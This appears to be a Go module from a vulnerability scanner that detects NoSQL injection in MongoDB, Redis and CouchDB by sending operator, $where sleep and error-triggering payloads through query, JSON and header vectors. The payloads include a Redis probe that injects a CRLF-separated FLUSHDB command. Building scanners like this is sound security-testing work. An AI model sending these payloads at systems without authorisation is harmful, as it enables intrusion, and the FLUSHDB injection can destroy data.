// Package nosqli implements NoSQL Injection detection.
//
// Source reference: NoSQLMap (MIT) + PayloadsAllTheThings NoSQL Injection
// section (MIT) — techniques and payloads are publicly documented algorithms,
// reimplemented from scratch without copying code.
//
// Databases targeted:
//   - MongoDB:  operator injection ($gt/$ne/$regex), JS injection (sleep/error),
//     $where clause injection, JSON body injection
//   - Redis:    command injection via pipeline separator (\r\n), eval injection
//   - CouchDB:  Mango query operator injection
//   - Generic:  operator prefix injection for unknown NoSQL backends
//
// Detection strategies:
//   - E  Error-based:   DB-specific error strings in response body
//   - B  Boolean-based: response differs for true vs false operator
//   - T  Time-based:    response delay from JS sleep (MongoDB $where)
//
// Injection vectors:
//   - GET query parameters (value replacement with operator payload)
//   - POST body (JSON operator injection via Content-Type: application/json)
//   - HTTP headers (User-Agent injection for log-based backends)
//
// Architecture:
//   - Probe struct: inject string + vector + detection function
//   - errgroup.SetLimit(Parallelism) fan-out across url × param × probe
//   - io.LimitReader on all response reads
//   - log/slog observability
//   - sync.Mutex protecting findings slice
//   - NewWithClient(*http.Client) for testability
//   - Dedup by url+param+probe_id
package nosqli

import (
	"bytes"
	"context"
	"fmt"
	"io"
	"log/slog"
	"net/http"
	"net/url"
	"strings"
	"sync"
	"time"

	"github.com/DonatoReis/blackhorn-modules/pkg/httpclient"
	"github.com/DonatoReis/blackhorn-modules/pkg/module"
	"golang.org/x/sync/errgroup"
)

// ─── Constants ───────────────────────────────────────────────────────────────

const (
	// DefaultTimeout is the per-request timeout for non-time-based probes.
	DefaultTimeout = 10 * time.Second

	// DefaultTimeBasedTimeout accommodates JS sleep in MongoDB $where.
	DefaultTimeBasedTimeout = 30 * time.Second

	// DefaultSleepMs is the sleep delay for time-based probes (milliseconds).
	DefaultSleepMs = 5000

	// DefaultParallelism is the max concurrent probes.
	DefaultParallelism = 15

	// maxBodyRead caps response body reads.
	maxBodyRead = 512 * 1024 // 512 KB

	// timeDeltaFactor: response is "delayed" if elapsed > sleep_ms * factor.
	timeDeltaFactor = 0.75
)

// Technique constants.
const (
	TechniqueError   = "E"
	TechniqueBoolean = "B"
	TechniqueTime    = "T"
)

// Vector constants — where the payload is injected.
const (
	VectorQuery  = "query"  // GET parameter
	VectorJSON   = "json"   // POST body as JSON
	VectorHeader = "header" // HTTP header
)

// ─── Probe ───────────────────────────────────────────────────────────────────

// Probe defines a single NoSQL injection test.
type Probe struct {
	// ID is a unique identifier.
	ID string
	// Technique: E, B, or T.
	Technique string
	// DB is the targeted backend: mongodb, redis, couchdb, generic.
	DB string
	// Vector: query, json, header.
	Vector string
	// Inject is the value to send (may contain {SLEEP_MS} placeholder).
	// For B technique, TrueInject + FalseInject are used instead.
	Inject      string
	TrueInject  string
	FalseInject string
	// Detect inspects the response body+status for E technique.
	Detect func(body string, status int) bool
	// Severity of a confirmed finding.
	Severity module.Severity
	// Tags are metadata tags.
	Tags []string
}

// ─── Module ──────────────────────────────────────────────────────────────────

// Module implements NoSQL Injection detection.
type Module struct {
	client          *http.Client
	timeBasedClient *http.Client
	probes          []Probe
	parallelism     int
	sleepMs         int
	techniques      map[string]bool
	logger          *slog.Logger
}

// New returns a Module with all built-in probes and default HTTP client.
func New() *Module {
	c := httpclient.New(httpclient.Options{Timeout: DefaultTimeout})
	tb := httpclient.New(httpclient.Options{Timeout: DefaultTimeBasedTimeout})
	return &Module{
		client:          c,
		timeBasedClient: tb,
		probes:          builtinProbes(),
		parallelism:     DefaultParallelism,
		sleepMs:         DefaultSleepMs,
		techniques:      map[string]bool{TechniqueError: true, TechniqueBoolean: true, TechniqueTime: true},
		logger:          slog.Default(),
	}
}

// NewWithClient returns a Module using the supplied HTTP client (testability).
func NewWithClient(c *http.Client) *Module {
	m := New()
	m.client = c
	m.timeBasedClient = c
	return m
}

// Name returns the module name.
func (m *Module) Name() string { return "nosqli" }

// Run executes NoSQL injection probes against all target URLs.
//
// Options:
//   - "parallelism"  — max concurrent probes (default: 15)
//   - "techniques"   — comma-separated E,B,T (default: all)
//   - "sleep_ms"     — sleep for time-based probes in ms (default: 5000)
//   - "db"           — target DB filter: mongodb, redis, couchdb, generic
func (m *Module) Run(ctx context.Context, input module.Input) ([]module.Finding, error) {
	targets := collectTargets(input)
	if len(targets) == 0 {
		return nil, nil
	}

	parallelism := m.parallelism
	if v := input.Options["parallelism"]; v != "" {
		if p, err := parseInt(v); err == nil && p > 0 {
			parallelism = p
		}
	}

	sleepMs := m.sleepMs
	if v := input.Options["sleep_ms"]; v != "" {
		if s, err := parseInt(v); err == nil && s > 0 {
			sleepMs = s
		}
	}

	techniques := m.techniques
	if v := input.Options["techniques"]; v != "" {
		techniques = parseTechniques(v)
	}

	dbFilter := strings.ToLower(strings.TrimSpace(input.Options["db"]))
	probes := m.selectProbes(techniques, dbFilter)

	var (
		mu       sync.Mutex
		seen     = make(map[string]struct{})
		findings []module.Finding
	)

	addFinding := func(f module.Finding) {
		key := f.URL + "|" + f.Extra["param"] + "|" + f.Extra["probe_id"]
		mu.Lock()
		defer mu.Unlock()
		if _, ok := seen[key]; !ok {
			seen[key] = struct{}{}
			findings = append(findings, f)
		}
	}

	eg, egCtx := errgroup.WithContext(ctx)
	eg.SetLimit(parallelism)

	for _, target := range targets {
		target := target
		params := extractParams(target)
		if len(params) == 0 {
			m.logger.DebugContext(ctx, "nosqli: no parameters found", "url", target)
			continue
		}

		for _, param := range params {
			param := param
			for _, probe := range probes {
				probe := probe
				eg.Go(func() error {
					var (
						f  module.Finding
						ok bool
					)
					switch probe.Technique {
					case TechniqueError:
						f, ok = m.probeError(egCtx, target, param, probe, sleepMs)
					case TechniqueBoolean:
						f, ok = m.probeBoolean(egCtx, target, param, probe)
					case TechniqueTime:
						f, ok = m.probeTime(egCtx, target, param, probe, sleepMs)
					}
					if ok {
						addFinding(f)
					}
					return nil
				})
			}
		}
	}

	_ = eg.Wait()
	return findings, nil
}

// ─── Probe execution ──────────────────────────────────────────────────────────

func (m *Module) probeError(ctx context.Context, rawURL, param string, p Probe, sleepMs int) (module.Finding, bool) {
	inject := strings.ReplaceAll(p.Inject, "{SLEEP_MS}", fmt.Sprintf("%d", sleepMs))
	body, status, err := m.doRequest(ctx, rawURL, param, inject, p.Vector, m.client)
	if err != nil {
		m.logger.DebugContext(ctx, "nosqli error probe failed", "url", rawURL, "err", err)
		return module.Finding{}, false
	}

	if p.Detect != nil && p.Detect(body, status) {
		return m.buildFinding(rawURL, param, p, inject, "error-based DB error detected"), true
	}
	return module.Finding{}, false
}

func (m *Module) probeBoolean(ctx context.Context, rawURL, param string, p Probe) (module.Finding, bool) {
	trueBody, trueStatus, err := m.doRequest(ctx, rawURL, param, p.TrueInject, p.Vector, m.client)
	if err != nil {
		return module.Finding{}, false
	}
	falseBody, falseStatus, err := m.doRequest(ctx, rawURL, param, p.FalseInject, p.Vector, m.client)
	if err != nil {
		return module.Finding{}, false
	}

	if trueStatus != 200 || falseStatus != 200 {
		return module.Finding{}, false
	}
	if trueBody == falseBody {
		return module.Finding{}, false
	}

	diff := abs(len(trueBody) - len(falseBody))
	minLen := len(trueBody)
	if len(falseBody) < minLen {
		minLen = len(falseBody)
	}
	if minLen == 0 || diff == 0 {
		return module.Finding{}, false
	}

	ratio := float64(diff) / float64(minLen)
	if ratio < 0.20 {
		return module.Finding{}, false
	}

	detail := fmt.Sprintf("boolean-based blind: true=%d bytes false=%d bytes diff=%.0f%%",
		len(trueBody), len(falseBody), ratio*100)
	return m.buildFinding(rawURL, param, p, p.TrueInject, detail), true
}

func (m *Module) probeTime(ctx context.Context, rawURL, param string, p Probe, sleepMs int) (module.Finding, bool) {
	inject := strings.ReplaceAll(p.Inject, "{SLEEP_MS}", fmt.Sprintf("%d", sleepMs))

	// Baseline.
	_, _, err := m.doRequest(ctx, rawURL, param, "test", p.Vector, m.client)
	if err != nil {
		return module.Finding{}, false
	}

	start := time.Now()
	_, _, err = m.doRequest(ctx, rawURL, param, inject, p.Vector, m.timeBasedClient)
	elapsed := time.Since(start)

	if err != nil {
		if strings.Contains(err.Error(), "deadline") || strings.Contains(err.Error(), "timeout") {
			detail := fmt.Sprintf("time-based: request timed out (sleep_ms=%d)", sleepMs)
			return m.buildFinding(rawURL, param, p, inject, detail), true
		}
		return module.Finding{}, false
	}

	threshold := time.Duration(float64(sleepMs)*timeDeltaFactor) * time.Millisecond
	if elapsed < threshold {
		return module.Finding{}, false
	}

	detail := fmt.Sprintf("time-based: elapsed=%s threshold=%s sleep_ms=%d",
		elapsed.Round(time.Millisecond), threshold.Round(time.Millisecond), sleepMs)
	return m.buildFinding(rawURL, param, p, inject, detail), true
}

func (m *Module) buildFinding(rawURL, param string, p Probe, inject, detail string) module.Finding {
	m.logger.InfoContext(context.Background(), "nosqli: vulnerability found",
		"url", rawURL, "param", param, "probe", p.ID, "db", p.DB)
	return module.Finding{
		Type:     "nosqli",
		Severity: p.Severity,
		URL:      rawURL,
		Detail:   fmt.Sprintf("[NoSQLi/%s/%s] param=%q vector=%s: %s", p.Technique, p.DB, param, p.Vector, detail),
		Extra: map[string]string{
			"param":      param,
			"probe_id":   p.ID,
			"technique":  p.Technique,
			"db":         p.DB,
			"vector":     p.Vector,
			"inject":     inject,
			"tags":       strings.Join(p.Tags, ","),
			"confidence": nosqliConfidence(p.Technique),
		},
	}
}

// nosqliConfidence maps NoSQLi technique → confidence per dicas.md §4.
// Error-based: DB error message is unambiguous → 0.93.
// Boolean-based: body-length differential — some false-positives possible → 0.80.
// Time-based: JS sleep timing — probabilistic → 0.72.
func nosqliConfidence(technique string) string {
	switch technique {
	case "E":
		return "0.93"
	case "B":
		return "0.80"
	case "T":
		return "0.72"
	default:
		return "0.85"
	}
}

// doRequest sends a request with the injection in the appropriate vector.
func (m *Module) doRequest(ctx context.Context, rawURL, param, inject, vector string, c *http.Client) (string, int, error) {
	var req *http.Request
	var err error

	switch vector {
	case VectorJSON:
		parsed, parseErr := url.Parse(rawURL)
		if parseErr != nil {
			return "", 0, parseErr
		}
		// Build JSON body: {"param": INJECT} where inject may already be JSON.
		jsonBody := buildJSONBody(param, inject)
		req, err = http.NewRequestWithContext(ctx, "POST", parsed.String(),
			bytes.NewReader([]byte(jsonBody)))
		if err != nil {
			return "", 0, err
		}
		req.Header.Set("Content-Type", "application/json")

	case VectorHeader:
		req, err = http.NewRequestWithContext(ctx, "GET", rawURL, nil)
		if err != nil {
			return "", 0, err
		}
		req.Header.Set("User-Agent", inject)

	default: // VectorQuery
		injected := injectParam(rawURL, param, inject)
		req, err = http.NewRequestWithContext(ctx, "GET", injected, nil)
		if err != nil {
			return "", 0, err
		}
	}

	req.Header.Set("Accept", "application/json, text/html, */*")

	resp, err := c.Do(req)
	if err != nil {
		return "", 0, err
	}
	defer resp.Body.Close()

	b, _ := io.ReadAll(io.LimitReader(resp.Body, maxBodyRead))
	return string(b), resp.StatusCode, nil
}

// ─── Helpers ─────────────────────────────────────────────────────────────────

func extractParams(rawURL string) []string {
	parsed, err := url.Parse(rawURL)
	if err != nil {
		return nil
	}
	var params []string
	for k := range parsed.Query() {
		params = append(params, k)
	}
	return params
}

func injectParam(rawURL, param, inject string) string {
	parsed, err := url.Parse(rawURL)
	if err != nil {
		return rawURL + inject
	}
	q := parsed.Query()
	q.Set(param, inject)
	parsed.RawQuery = q.Encode()
	return parsed.String()
}

func buildJSONBody(param, inject string) string {
	// If inject is already a JSON object/array, embed it directly.
	trimmed := strings.TrimSpace(inject)
	if strings.HasPrefix(trimmed, "{") || strings.HasPrefix(trimmed, "[") {
		return fmt.Sprintf(`{%q:%s}`, param, inject)
	}
	return fmt.Sprintf(`{%q:%q}`, param, inject)
}

func collectTargets(input module.Input) []string {
	seen := make(map[string]struct{})
	var out []string
	add := func(u string) {
		u = strings.TrimSpace(u)
		if u == "" {
			return
		}
		if _, ok := seen[u]; !ok {
			seen[u] = struct{}{}
			out = append(out, u)
		}
	}
	if input.Target != "" {
		add(input.Target)
	}
	for _, u := range input.URLs {
		add(u)
	}
	return out
}

func parseTechniques(s string) map[string]bool {
	tm := make(map[string]bool)
	for _, t := range strings.Split(strings.ToUpper(s), ",") {
		t = strings.TrimSpace(t)
		if t != "" {
			tm[t] = true
		}
	}
	return tm
}

func parseInt(s string) (int, error) {
	var n int
	_, err := fmt.Sscanf(strings.TrimSpace(s), "%d", &n)
	return n, err
}

func abs(x int) int {
	if x < 0 {
		return -x
	}
	return x
}

func (m *Module) selectProbes(techniques map[string]bool, dbFilter string) []Probe {
	var out []Probe
	for _, p := range m.probes {
		if !techniques[p.Technique] {
			continue
		}
		if dbFilter != "" && dbFilter != "all" {
			if p.DB != dbFilter && p.DB != "generic" {
				continue
			}
		}
		out = append(out, p)
	}
	return out
}

// ─── Built-in probes ─────────────────────────────────────────────────────────

// builtinProbes returns the default NoSQL injection probe set.
// Payloads from NoSQLMap (MIT) + PayloadsAllTheThings NoSQL section (MIT).
func builtinProbes() []Probe {

	// ── MongoDB error patterns ─────────────────────────────────────────────
	mongoErrors := []string{
		"bsontypes.undefined",
		"invalid bson",
		"mongoclient",
		"mongoerror",
		"e11000 duplicate key error",
		"$where clause",
		"cursor id",
		"bson.objectid",
		"mongoexception",
		"mongodriverexception",
		`query failed with error code`,
		"ns doesn't exist",
		"errmsg",
		"code: 2",  // BadValue
		"code: 17", // TypeMismatch
		"code: 9",  // FailedToParse
	}

	// ── Redis error patterns ───────────────────────────────────────────────
	redisErrors := []string{
		"err wrong number of arguments",
		"wrongtype operation",
		"redis.exceptions",
		"redisconnectionerror",
		"-err unknown command",
		"redis error",
		"jedis",
		"ioredis",
	}

	// ── CouchDB error patterns ─────────────────────────────────────────────
	couchErrors := []string{
		`"error":"bad_request"`,
		`"reason":"invalid_json"`,
		"couchdb",
		`"error":"not_found"`,
		"mango_query",
	}

	// error detect builder
	errDetect := func(patterns []string) func(string, int) bool {
		return func(body string, _ int) bool {
			lower := strings.ToLower(body)
			for _, p := range patterns {
				if strings.Contains(lower, strings.ToLower(p)) {
					return true
				}
			}
			return false
		}
	}

	probes := []Probe{

		// ══════════════════════════════════════════════════════════════
		// MongoDB — Error-based
		// ══════════════════════════════════════════════════════════════

		// Operator injection — $gt (always true)
		{ID: "mongo-error-quote", Technique: TechniqueError, DB: "mongodb", Vector: VectorQuery,
			Inject: `'`, Severity: module.SeverityHigh,
			Detect: errDetect(mongoErrors),
			Tags:   []string{"nosqli", "error", "mongodb"}},

		// $where JS injection triggers parse error
		{ID: "mongo-where-error", Technique: TechniqueError, DB: "mongodb", Vector: VectorQuery,
			Inject: `{"$where":"this.a==1"}`, Severity: module.SeverityHigh,
			Detect: errDetect(mongoErrors),
			Tags:   []string{"nosqli", "error", "mongodb", "where"}},

		// JSON operator error (invalid BSON type)
		{ID: "mongo-json-type-error", Technique: TechniqueError, DB: "mongodb", Vector: VectorJSON,
			Inject: `{"$gt":""}`, Severity: module.SeverityHigh,
			Detect: errDetect(append(mongoErrors, "invalid", "bson")),
			Tags:   []string{"nosqli", "error", "mongodb", "json"}},

		// ══════════════════════════════════════════════════════════════
		// MongoDB — Boolean-based blind
		// ══════════════════════════════════════════════════════════════

		// $ne (not equal) — always true vs restrictive false
		{ID: "mongo-bool-ne-query", Technique: TechniqueBoolean, DB: "mongodb", Vector: VectorQuery,
			TrueInject:  `{"$ne":"__unlikely_value_xyz__"}`,
			FalseInject: `{"$ne":""}`,
			Severity:    module.SeverityHigh,
			Tags:        []string{"nosqli", "boolean", "mongodb"}},

		// $gt with empty string — always true vs $lt
		{ID: "mongo-bool-gt-query", Technique: TechniqueBoolean, DB: "mongodb", Vector: VectorQuery,
			TrueInject:  `{"$gt":""}`,
			FalseInject: `{"$lt":""}`,
			Severity:    module.SeverityHigh,
			Tags:        []string{"nosqli", "boolean", "mongodb"}},

		// $regex match-all vs no-match
		{ID: "mongo-bool-regex-query", Technique: TechniqueBoolean, DB: "mongodb", Vector: VectorQuery,
			TrueInject:  `{"$regex":".*"}`,
			FalseInject: `{"$regex":"^$NOMATCH$"}`,
			Severity:    module.SeverityHigh,
			Tags:        []string{"nosqli", "boolean", "mongodb"}},

		// JSON body: $ne operator
		{ID: "mongo-bool-ne-json", Technique: TechniqueBoolean, DB: "mongodb", Vector: VectorJSON,
			TrueInject:  `{"$ne":"__unlikely_xyz__"}`,
			FalseInject: `{"$eq":"__unlikely_xyz__"}`,
			Severity:    module.SeverityHigh,
			Tags:        []string{"nosqli", "boolean", "mongodb", "json"}},

		// ══════════════════════════════════════════════════════════════
		// MongoDB — Time-based ($where + sleep)
		// ══════════════════════════════════════════════════════════════

		{ID: "mongo-time-where-sleep", Technique: TechniqueTime, DB: "mongodb", Vector: VectorQuery,
			Inject:   `{"$where":"function(){var d=new Date();while((new Date()-d)<{SLEEP_MS}){}return true;}"}`,
			Severity: module.SeverityHigh,
			Tags:     []string{"nosqli", "time", "mongodb", "where"}},

		{ID: "mongo-time-sleep-query", Technique: TechniqueTime, DB: "mongodb", Vector: VectorQuery,
			Inject:   `{"$where":"sleep({SLEEP_MS})"}`,
			Severity: module.SeverityHigh,
			Tags:     []string{"nosqli", "time", "mongodb"}},

		// ══════════════════════════════════════════════════════════════
		// Redis — Error-based
		// ══════════════════════════════════════════════════════════════

		{ID: "redis-error-inject", Technique: TechniqueError, DB: "redis", Vector: VectorQuery,
			Inject: "0\r\nFLUSHDB\r\n", Severity: module.SeverityHigh,
			Detect: errDetect(redisErrors),
			Tags:   []string{"nosqli", "error", "redis"}},

		{ID: "redis-eval-error", Technique: TechniqueError, DB: "redis", Vector: VectorQuery,
			Inject: `EVAL "return 1" 0`, Severity: module.SeverityHigh,
			Detect: errDetect(redisErrors),
			Tags:   []string{"nosqli", "error", "redis"}},

		// ══════════════════════════════════════════════════════════════
		// CouchDB — Error-based
		// ══════════════════════════════════════════════════════════════

		{ID: "couchdb-selector-error", Technique: TechniqueError, DB: "couchdb", Vector: VectorJSON,
			Inject:   `{"selector":{"$invalid_op":1}}`,
			Severity: module.SeverityHigh,
			Detect:   errDetect(couchErrors),
			Tags:     []string{"nosqli", "error", "couchdb"}},

		// ══════════════════════════════════════════════════════════════
		// Generic — Error-based (any NoSQL backend)
		// ══════════════════════════════════════════════════════════════

		// Operator prefix injection
		{ID: "generic-dollar-prefix", Technique: TechniqueError, DB: "generic", Vector: VectorQuery,
			Inject: `{"$gt":0}`, Severity: module.SeverityMedium,
			Detect: func(body string, status int) bool {
				lower := strings.ToLower(body)
				return strings.Contains(lower, "syntax error") ||
					strings.Contains(lower, "invalid query") ||
					strings.Contains(lower, "parse error") ||
					strings.Contains(lower, "unexpected token") ||
					status == 500
			},
			Tags: []string{"nosqli", "error", "generic"}},

		// Array injection
		{ID: "generic-array-inject", Technique: TechniqueError, DB: "generic", Vector: VectorQuery,
			Inject: `["admin"]`, Severity: module.SeverityMedium,
			Detect: func(body string, status int) bool {
				lower := strings.ToLower(body)
				return strings.Contains(lower, "invalid type") ||
					strings.Contains(lower, "cast") ||
					strings.Contains(lower, "cannot convert") ||
					status == 500
			},
			Tags: []string{"nosqli", "error", "generic"}},

		// ══════════════════════════════════════════════════════════════
		// Generic — Boolean-based
		// ══════════════════════════════════════════════════════════════

		{ID: "generic-bool-ne", Technique: TechniqueBoolean, DB: "generic", Vector: VectorQuery,
			TrueInject:  `{"$ne":"__UNLIKELY__"}`,
			FalseInject: `__VERY_UNLIKELY_VAL_XYZABC__`,
			Severity:    module.SeverityMedium,
			Tags:        []string{"nosqli", "boolean", "generic"}},
	}

	return probes
}
